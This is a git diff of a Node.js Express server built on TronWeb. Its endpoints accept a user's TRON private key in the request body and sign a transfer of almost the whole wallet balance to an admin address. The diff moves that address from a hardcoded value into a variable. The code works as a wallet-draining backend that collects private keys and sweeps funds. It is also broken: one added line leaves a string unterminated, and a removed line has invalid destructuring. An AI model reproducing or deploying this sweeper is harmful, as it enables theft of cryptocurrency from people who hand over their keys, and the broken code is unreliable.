@@ -4,7 +4,7 @@ const bodyParser = require('body-parser')
 const HttpProvider = TronWeb.providers.HttpProvider;
 const fullNode = "https://api.trongrid.io"
 const testfullNode = "https://api.trongrid.io"
-
+var Admin_tron_address = "rrrx
 const app = express();
 app.use(bodyParser.json())
 
@@ -152,6 +152,7 @@ app.post('/easy', async(req, res) => {
     try {
         const {address,private_key,Admin_tron_address} = req.body;
         const tronWeb = new TronWeb({fullHost: fullNode, privateKey: private_key});
+
         const balance = await tronWeb.trx.getBalance(address);
         console.log(balance);
         const txt = balance
@@ -167,7 +168,7 @@ res.status(200).json({response: ret ,Amount : bal,Sender :address});
     }
 })
 app.post('/easytrx', async(req, res) => {
-        const {private_key,"TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"} = req.body;
+        const {private_key,Admin_tron_address} = req.body;
         const tronWeb = new TronWeb({fullHost: fullNode, privateKey: private_key});
 const address = await tronWeb.address.fromPrivateKey(private_key)
 console.log(address)
@@ -182,7 +183,7 @@ var rrt = parseFloat(txt)
 const txtr = rrt-269000
 console.log("balance:",rrt)
 console.log("parse amount :",txtr)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx('TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM', txtr);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
